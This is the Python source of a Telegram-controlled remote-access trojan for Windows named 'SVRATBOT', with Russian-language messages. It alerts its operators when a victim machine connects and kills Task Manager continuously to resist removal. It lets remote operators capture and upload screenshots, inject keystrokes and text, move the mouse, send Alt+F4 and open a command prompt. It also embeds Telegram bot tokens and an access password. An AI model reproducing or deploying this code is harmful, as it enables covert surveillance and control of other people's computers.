import os
import webbrowser
from pathlib import Path
import telebot
from telebot import types
import mouse
import keyboard
import random
import time
import subprocess
#from urllib.request import urlretrieve
#import urllib.request
import pyautogui
import sys
import threading
import socket
import shutil
import winreg as reg

#old_token = "7614720256:AAFkRPiJTp5S1Tyf2smFpMLovZWavVlFqsE"
#old_token = "7614720256:AAH92xjbTNjTV_YEgIElwZP1fKAnkL3v1yg"
token = "7921728161:AAHK0gLlip8LhQmZhnwnTHpjG7vfxEFM3oA"
bot = telebot.TeleBot(token)
#old_pas = "оторвался_хуй_123"
pas = "CKwIKJFR-F1LQ-5_вкщшшпрукшр"
sec = 0
users = {}
admins = ["1780801076"]
old_admins = ["1347372992", "5208227080"]

started = False
def notify():
    global started
    if not started:
        computer_name = socket.gethostname()
        for user_id in admins:
            bot.send_message(user_id, f"Пользователь *{computer_name}* подключился\nВведите /start для начала работы", parse_mode='Markdown')
            #bot.send_message(user_id, f"Введите /start для начала работы")
        started = True

notify()

kill_task_manager_enabled = True
def kill_task_manager():
    while True:
        if kill_task_manager_enabled:
            try:
                tasks = subprocess.getoutput('tasklist').split('\n')[3:]  # [3:] для русской Windows
                for task in tasks:
                    if 'taskmgr.exe' in task.lower():
                        os.system('taskkill /im taskmgr.exe /f >nul 2>&1')
            except:
                pass
        time.sleep(0.5)

task_manager_thread = threading.Thread(target=kill_task_manager, daemon=True)
task_manager_thread.start()

@bot.message_handler(commands=['vernipurple'])
def vernipurple(message):
    user_id = str(message.from_user.id)
    if user_id not in users:
        return
    webbrowser.open('https://music.youtube.com/watch?v=o1dj3p_dOkM', new=2)

@bot.message_handler(commands=['mousem'])
def mousem(message):
    user_id = str(message.from_user.id)
    if user_id not in users:
        return
    if len(message.text.split(' ')) == 1:
        for i in range(5):
            mouse.move(random.randint(0, 1000), random.randint(0, 1000) ,duration=0.2)
            time.sleep(random.uniform(0.1, 1.0))
    else:
        for i in range(int(message.text.split(' ')[1])):
            mouse.move(random.randint(0, 1000), random.randint(0, 1000), duration=0.2)
            time.sleep(random.uniform(0.1, 1.0))

@bot.message_handler(commands=['cmd'])
def cmd(message):
    user_id = str(message.from_user.id)
    if user_id not in users:
        return
    # process = subprocess.Popen("cmd", shell=True)
    # time.sleep(1)
    # process.terminate()
    os.system("start cmd")
    # subprocess.run('cmd /c "timeout /t 100 & exit"', shell=True)

@bot.message_handler(commands=['screenshot'])
def screen(message):
    user_id = str(message.from_user.id)
    if user_id not in users:
        return
    screen = pyautogui.screenshot()
    screen.save("image.png")
    # p = open("image.png", "rb")
    # bot.send_photo(message.chat.id, p)
    with open("image.png", "rb") as p:
        bot.send_photo(message.chat.id, p)
    os.remove("image.png")

@bot.message_handler(commands=['keyboardp'])
def keyboardp(message):
    user_id = str(message.from_user.id)
    if user_id not in users:
        return
    list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    if len(message.text.split(' ')) == 1:
        for i in range(5):
            keyboard.send(random.choice(list))
            time.sleep(random.uniform(0.1, 1.0))
    else:
        for i in range(int(message.text.split(' ')[1])):
            keyboard.send(random.choice(list))
            time.sleep(random.uniform(0.1, 1.0))

@bot.message_handler(commands=['altf4'])
def altf4(message):
    user_id = str(message.from_user.id)
    if user_id not in users:
        return
    time.sleep(1.5)
    keyboard.send("alt+f4")

@bot.message_handler(commands=['kbinput'])
def kbinput(message):
    user_id = str(message.from_user.id)
    if user_id not in users:
        return
    text = message.text[8:].strip()
    keyboard.write(text)

@bot.message_handler(commands=['taskmgrkill_on'])
def enable_taskmgr_kill(message):
    user_id = str(message.from_user.id)
    if user_id not in users:
        return
    global kill_task_manager_enabled
    kill_task_manager_enabled = True
    bot.send_message(message.chat.id, "Закрытие диспетчера задач включено!")
    #bot.reply_to(message, "🔴 **Убийство Диспетчера задач включено!**", parse_mode='Markdown')

@bot.message_handler(commands=['taskmgrkill_off'])
def disable_taskmgr_kill(message):
    user_id = str(message.from_user.id)
    if user_id not in users:
        return
    global kill_task_manager_enabled
    kill_task_manager_enabled = False
    bot.send_message(message.chat.id, "Закрытие диспетчера задач выключено!")
    #bot.reply_to(message, "🟢 **Убийство Диспетчера задач отключено!**", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_message(message):
    global sec
    user_id = str(message.from_user.id)
    if user_id in admins:
        if user_id not in users:
            users[user_id] = True
            #bot.send_message("1347372992", f"{user_id} подключился к боту")
            bot.send_message(message.chat.id, "Доступ разрешён без ввода пароля")
            bot.send_message(message.chat.id, "Добро пожаловать в SVRATBOT! Версия бота: 2.5")
            show_menu(message)
        return
    if sec == 1:
        user_id = str(message.from_user.id)
        if user_id in users:
            show_menu(message)
        else:
            bot.send_message(message.chat.id, "Введите пароль командой /password")
    else:
        bot.send_message(message.chat.id, "Введите пароль командой /password")

def show_menu(message):
    bot.send_message(message.chat.id, "Выберите действие:")
    bot.send_message(message.chat.id, f"/vernipurple - Включить VerniPurple в браузере\n/mousem (кол-во) - Начать дёргать мышь в случайном направлении\n/cmd - Открыть cmd\n/screenshot - сделать скриншот и отправить сюда\n/keyboardp (кол-во) - начать нажимать случайные клавиши\n/altf4 - нажать альт ф4\n/kbinput (текст) - ввести ваш текст\n/taskmgrkill_on и /taskmgrkill_off - включить и выключить закрытие диспетчера задач (по умолчанию выключено)\n")

@bot.message_handler(commands=['password'])
def password(message):
    global sec
    text = message.text[9:].strip()
    if text == pas:
        user_id = str(message.from_user.id)
        sec = 1
        show_menu(message)
        users[user_id] = True
        #bot.send_message("1347372992",f"{user_id} подключился к боту")
        bot.send_message(message.chat.id, "Версия бота: 2.5")
    else:
        bot.send_message(message.chat.id, "Неверный пароль")




bot.infinity_polling()